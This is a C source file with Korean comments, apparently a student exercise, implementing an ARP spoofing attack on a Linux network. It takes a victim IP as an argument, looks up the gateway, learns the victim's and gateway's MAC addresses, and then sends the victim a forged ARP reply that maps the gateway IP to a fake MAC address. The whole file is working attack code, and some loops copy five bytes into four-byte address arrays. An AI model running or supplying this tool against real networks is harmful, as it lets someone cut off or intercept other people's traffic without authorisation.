#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <string.h>
#include <asm/types.h>

#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>

#include <math.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

#define PROTO_ARP 0x0806
#define ETH2_HEADER_LEN 14
#define HW_TYPE 1
#define PROTOCOL_TYPE 0x800
#define MAC_LENGTH 6
#define IPV4_LENGTH 4
#define ARP_REQUEST 0x01
#define ARP_REPLY 0x002
#define BUF_SIZE 60

unsigned char* default_device="enp0s3";//ethernet 이름
typedef enum {false, true} bool;
struct arp_header//헤더
{
        unsigned short hardware_type;
        unsigned short protocol_type;
        unsigned char hardware_len;
        unsigned char  protocol_len;
        unsigned short opcode;
        unsigned char sender_mac[MAC_LENGTH];
        unsigned char sender_ip[IPV4_LENGTH];
        unsigned char target_mac[MAC_LENGTH];
        unsigned char target_ip[IPV4_LENGTH];
};


unsigned char* getMyGatewayIp(){//디폴트 게이트웨이의 ip주소를 찾아서 반환
	unsigned char* gateway=NULL;
	char line[100];
	FILE *f=popen("netstat -rn", "r");
	char *head, *tail;

	char *def="0.0.0.0";
	while(fgets(line, 100, f) !=NULL){
		if(!strncmp(def, line, strlen(def))){//nestat 결과 desitnation이 0.0.0.0인 gateway ip
			head=strstr(line,"0.0.0.0         ");
			head+=strlen("0.0.0.0         ");
			tail=strstr(head,"0.0.0.0");
				
			gateway=malloc(1+tail-head);
			memcpy(gateway,head,tail-head);
			break;
		}

	}
	
	pclose(f);
	printf("Gateway address is : %s\n", gateway);

	return gateway;

	
}



int main(int argc, char* argv[])
{
        int fd,i;
        unsigned char buffer[BUF_SIZE];
        unsigned char source_ip[4];
        unsigned char target_ip[4];//공격대상 입력받기
	unsigned char false_mac[6]= {77,77,77,77,77,77};//가짜 게이트웨이 주소
	unsigned char target_mac[6];
	unsigned char gateway_ip[4];
	unsigned char gateway_mac[6];
	unsigned char* interface=default_device;
	unsigned char* ip;
	unsigned char sip[4];
	char *a,*b,*c,*d;
	unsigned char* mac;
	unsigned char* gateway;
	bool same=true;
	int ifindex, index,ret, length;

        struct ifreq ifr;
	//victim에게 보낼 arp reqest/받은 reply의 이더넷과 arp헤더
        struct ethhdr *send_req = (struct ethhdr *)buffer;
        struct ethhdr *rcv_resp= (struct ethhdr *)buffer;
        struct arp_header *arp_req = (struct arp_header *)(buffer+ETH2_HEADER_LEN);
        struct arp_header *arp_resp = (struct arp_header *)(buffer+ETH2_HEADER_LEN);
	//gateway에게 보낼/받을 헤더
	struct ethhdr *send_req2 = (struct ethhdr *)buffer;
        struct ethhdr *rcv_resp2= (struct ethhdr *)buffer;
        struct arp_header *arp_req2 = (struct arp_header *)(buffer+ETH2_HEADER_LEN);
        struct arp_header *arp_resp2 = (struct arp_header *)(buffer+ETH2_HEADER_LEN);
	//victim에게 보낼 arp_reply 헤더
	struct ethhdr *send_rpl = (struct ethhdr *)buffer;
        struct arp_header *arp_rpl = (struct arp_header *)(buffer+ETH2_HEADER_LEN);



        struct sockaddr_ll socket_address;
	//입력받은 공격대상
	if(argc<2){
	printf("공격할 주소를 입력하세요\n");
	return 0;
}
	a=strtok(argv[1],".");
	b=strtok(NULL,".");
	c=strtok(NULL, ".");
	d=strtok(NULL, ".");
	
	target_ip[0]=atoi(a);
	target_ip[1]=atoi(b);
	target_ip[2]=atoi(c);
	target_ip[3]=atoi(d);


	gateway=getMyGatewayIp();
	
	printf("Gateway name is :%s\n", interface);

	a=strtok(gateway, ".");//.기준으로 자르기
	b=strtok(NULL,".");
	c=strtok(NULL, ".");
	d=strtok(NULL, ".");
	
	gateway_ip[0]=atoi(a);
	gateway_ip[1]=atoi(b);
	gateway_ip[2]=atoi(c);
	gateway_ip[3]=atoi(d);
	/*
	printf("My gateway ip is :");
	for(i=0;i<4;i++){
		printf("%d.",gateway_ip[i]);
	}
	printf("\b\n");
*/
	//소켓열기
	fd=socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if(fd==-1){
		perror("socket():");
		exit(1);
	}
	ifr.ifr_addr.sa_family=AF_INET;
	strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);

	if(ioctl(fd, SIOCGIFADDR, &ifr)==-1){
		perror("SIOCGIFINDEX");
		exit(1);
	}
	
	//내 ip주소 가져오기	
	ip=inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
	
	
	printf("My IP address is : %s\n", ip);
	a=strtok(ip, ".");//.기준으로 자르기
	b=strtok(NULL,".");
	c=strtok(NULL, ".");
	d=strtok(NULL, ".");
	
	source_ip[0]=atoi(a);
	source_ip[1]=atoi(b);
	source_ip[2]=atoi(c);
	source_ip[3]=atoi(d);
	
	//내 mac주소 가져오기
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) ==-1){
                perror("SIOCGIFINDEX");
                exit(1);
        }
	mac=(unsigned char*)ifr.ifr_hwaddr.sa_data;
	printf("Mac address : %.2x:%.2x:%.2x:%.2x:%02x:%02x\n", mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
	
 	
	memset(buffer,0x00,60);
       
	 //ethernet interface index
    	if (ioctl(fd, SIOCGIFINDEX, &ifr) == -1){
		perror("SIOCGIFINDEX");
		exit(1);
	    }
	    ifindex = ifr.ifr_ifindex;

      close(fd);

        for (index = 0; index < 6; index++){
                send_req->h_dest[index] = (unsigned char)0xff;//broadcast
                arp_req->target_mac[index] = (unsigned char)0x00;//알고싶은것
                send_req->h_source[index] = (unsigned char)mac[index];
                arp_req->sender_mac[index] = (unsigned char)mac[index];
                socket_address.sll_addr[index] = (unsigned char)mac[index];
        }
     
        socket_address.sll_family = AF_PACKET;
        socket_address.sll_protocol = htons(ETH_P_ARP);
        socket_address.sll_ifindex = ifindex;
        socket_address.sll_hatype = htons(ARPHRD_ETHER);
        socket_address.sll_pkttype = (PACKET_BROADCAST);
        socket_address.sll_halen = MAC_LENGTH;
        socket_address.sll_addr[6] = 0x00;
        socket_address.sll_addr[7] = 0x00;
        send_req->h_proto = htons(ETH_P_ARP);
        arp_req->hardware_type = htons(HW_TYPE);
        arp_req->protocol_type = htons(ETH_P_IP);
        arp_req->hardware_len = MAC_LENGTH;
        arp_req->protocol_len =IPV4_LENGTH;
        arp_req->opcode = htons(ARP_REQUEST);
        for(index=0;index<5;index++){
                arp_req->sender_ip[index]=(unsigned char)source_ip[index];
                arp_req->target_ip[index]=(unsigned char)target_ip[index];
        }
//request 보낼 소켓 열기
	  if ((fd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
	    perror ("socket() failed ");
	    exit (EXIT_FAILURE);
	  }

	buffer[32]=0x00;
        ret = sendto(fd, buffer, 42, 0, (struct  sockaddr*)&socket_address, sizeof(socket_address));
        if(ret == -1){
                perror("sendto():");
                exit(1);
        }
        else{
                printf("Send ARP REQUEST PAKECT to victim \n\t");
                for(index=0;index<42;index++){
                        printf("%02X ",buffer[index]);
                        if(index % 16 ==0 && index !=0)
                        {printf("\n\t");}
                }
        }
	printf("\n\t");

	//패킷 응답 찾기

        memset(buffer,0x00,60);
        while(1)
        {
                length = recvfrom(fd, buffer, BUF_SIZE, 0, NULL, NULL);
                if (length == -1){
                        perror("recvfrom():");
                        exit(1);
                }
		same=true;
                if(htons(rcv_resp->h_proto) == PROTO_ARP){//arp패킷일때만	
			                        
				for(i=0;i<4;i++){//victim ipd와 같을 때
					if(arp_resp->sender_ip[i] != target_ip[i])
						same=false;
				}
				
				if(same){
					
				        printf("Received ARP reply(len=%d)\n",length);
				        printf("Sender IP(IP of the victim) :");
				        for(index=0;index<4;index++)
				                printf("%u.",(unsigned int)arp_resp->sender_ip[index]);

				        printf("\n Sender MAC(Mac of the victim) :");
				        for(index=0;index<6;index++)
				                printf(" %02X:",arp_resp->sender_mac[index]);
					
					for(i=0;i<6;i++){
						target_mac[i]=arp_resp->sender_mac[i];
					}

				       printf("\n\n");
				        break;
				}
			
			
                }
        }



//get gateway mac address
 for (index = 0; index < 6; index++){

                send_req2->h_dest[index] = (unsigned char)0xff;//broadcast
                arp_req2->target_mac[index] = (unsigned char)0x00;//알고 싶음
                send_req2->h_source[index] = (unsigned char)mac[index];
                arp_req2->sender_mac[index] = (unsigned char)mac[index];
                socket_address.sll_addr[index] = (unsigned char)mac[index];
        }
     
        socket_address.sll_family = AF_PACKET;
        socket_address.sll_protocol = htons(ETH_P_ARP);
        socket_address.sll_ifindex = ifindex;
        socket_address.sll_hatype = htons(ARPHRD_ETHER);
        socket_address.sll_pkttype = (PACKET_BROADCAST);
        socket_address.sll_halen = MAC_LENGTH;
        socket_address.sll_addr[6] = 0x00;
        socket_address.sll_addr[7] = 0x00;
        send_req2->h_proto = htons(ETH_P_ARP);
        arp_req2->hardware_type = htons(HW_TYPE);
        arp_req2->protocol_type = htons(ETH_P_IP);
        arp_req2->hardware_len = MAC_LENGTH;
        arp_req2->protocol_len =IPV4_LENGTH;
        arp_req2->opcode = htons(ARP_REQUEST);
        for(index=0;index<5;index++){
                arp_req2->sender_ip[index]=(unsigned char)source_ip[index];
                arp_req2->target_ip[index]=(unsigned char)gateway_ip[index];//게이트웨이의 ip를 타겟ip로해서 reply를 받고 싶다
        }

	  if ((fd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) <0){
	    perror ("socket() failed ");
	    exit (EXIT_FAILURE);
	  }

	buffer[32]=0x00;
        ret = sendto(fd, buffer, 42, 0, (struct  sockaddr*)&socket_address, sizeof(socket_address));
        if (ret == -1){
                perror("sendto():");
                exit(1);
        }
        else{
                printf("Sent ARP REQEUST PACKET TO GATEWAY \n\t");
                for(index=0;index<42;index++)
                {
                        printf("%02X ",buffer[index]);
                        if(index % 16 ==0 && index !=0)
                        {printf("\n\t");
				}
                }
        }
		printf("\n\t");



	//receive gateway mac address reply
	//패킷 받기
        memset(buffer,0x00,60);
        while(1){
                length = recvfrom(fd, buffer, BUF_SIZE, 0, NULL, NULL);
                if (length == -1){
                        perror("recvfrom():");
                        exit(1);
                }
		same=true;
                if(htons(rcv_resp2->h_proto) == PROTO_ARP){	//arp packet
		
				for(i=0;i<4;i++){
					if(arp_resp2->sender_ip[i] != gateway_ip[i])//내가 찾는 게이트웨이  ip
						same=false;
				}
				
				if(same){
					
				        printf("RECEIVED ARP REPLY PACKET(len=%d)\n",length);
				        printf("Sender IP(PROBABLY GATEWAY IP) :");
				        for(index=0;index<4;index++)
				                printf("%u.",(unsigned int)arp_resp2->sender_ip[index]);

				        printf("\nSender MAC(GATEWAY MAC) :");
				        for(index=0;index<6;index++)
				                printf(" %02X:",arp_resp2->sender_mac[index]);
					
					for(i=0;i<6;i++){
						gateway_mac[i]=arp_resp2->sender_mac[i];
					}


				        printf("\n  :");

				        break;
				}
			
			
                }
        }




//send arp reply packet to victim

 for (index = 0; index < 6; index++){
                send_rpl->h_dest[index] = target_mac[index];//공격대상 mac
                arp_rpl->target_mac[index] =target_mac[index];//공격대상 mac
                send_rpl->h_source[index] = (unsigned char)mac[index];//실제
                arp_rpl->sender_mac[index] = (unsigned char)false_mac[index];//위조된 주소
                socket_address.sll_addr[index] = (unsigned char)gateway_mac[index];
        }
     
        socket_address.sll_family = AF_PACKET;
        socket_address.sll_protocol = htons(ETH_P_ARP);
        socket_address.sll_ifindex = ifindex;
        socket_address.sll_hatype = htons(ARPHRD_ETHER);
        socket_address.sll_pkttype = (PACKET_BROADCAST);
        socket_address.sll_halen = MAC_LENGTH;
        socket_address.sll_addr[6] = 0x00;
        socket_address.sll_addr[7] = 0x00;

        send_req->h_proto = htons(ETH_P_ARP);

        arp_rpl->hardware_type = htons(HW_TYPE);
        arp_rpl->protocol_type = htons(ETH_P_IP);
        arp_rpl->hardware_len = MAC_LENGTH;
        arp_rpl->protocol_len =IPV4_LENGTH;
        arp_rpl->opcode = htons(ARP_REPLY);//reply packet
        for(index=0;index<5;index++){
                arp_rpl->sender_ip[index]=(unsigned char)gateway_ip[index];
                arp_rpl->target_ip[index]=(unsigned char)target_ip[index];
        }
  // Submit request for a raw socket descriptor.
  if ((fd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
    perror ("socket() failed ");
    exit (EXIT_FAILURE);
  }

buffer[32]=0x00;
        ret = sendto(fd, buffer, 42, 0, (struct  sockaddr*)&socket_address, sizeof(socket_address));
        if (ret == -1){
                perror("sendto():");
                exit(1);
        }
        else{
                printf(" Sent false reply packet to victim \n\t");
                for(index=0;index<42;index++){
                        printf("%02X ",buffer[index]);
                        if(index % 16 ==0 && index !=0)
                        {printf("\n\t");}
                }
        }
printf("\n\t");


	

        return 0;
}
